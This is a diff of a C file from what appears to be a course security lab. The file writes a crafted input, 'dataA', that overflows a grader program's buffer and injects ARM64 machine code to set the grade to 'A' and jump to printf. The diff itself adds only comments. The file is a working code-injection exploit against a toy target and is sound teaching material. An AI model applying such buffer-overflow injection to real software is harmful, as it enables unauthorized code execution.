@@ -1,9 +1,14 @@
+/*------------------------------------------------------------
+Authors: Chris Paucar and Christian Ronda
+createdataA.c
+------------------------------------------------------------*/
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <sys/mman.h>
 #include "miniassembler.h"
-
+/*generates dataA file which is used as input to grader program
+  which will be used in our A attack. Returns 0.*/
 int main(void){
     int i;
     FILE *psFile;
@@ -13,13 +18,13 @@ int main(void){
     unsigned int strb;
     unsigned int b;
 
-    /* adr x1, [sp, grade] */
+    /* machine code for this instruction: adr x1, [sp, grade] */
     adr = MiniAssembler_adr(1, 0x420044, 0x42006C);
-    /* mov w0, "A" */
+    /* machine code for this instruction: mov w0, "A" */
     mov = MiniAssembler_mov(0, 0x000041);
-    /* strb w0, [x1] */
+    /* machine code for this instruction: strb w0, [x1] */
     strb = MiniAssembler_strb(0, 1);
-    /* b printf */
+    /* machine code for this instruction: b printf */
     b = MiniAssembler_b(0x400864, 0x420074);
     psFile = fopen("dataA", "w");
     
@@ -28,7 +33,7 @@ int main(void){
 
     /* puts Chris Paucar in the first 12 spots of text file */
     fprintf(psFile,"Chris Paucar");
-
+    /*put 4 null bytes afterwards*/
     for(i = 0; i < 4; i++){
         putc('\0', psFile);
     }
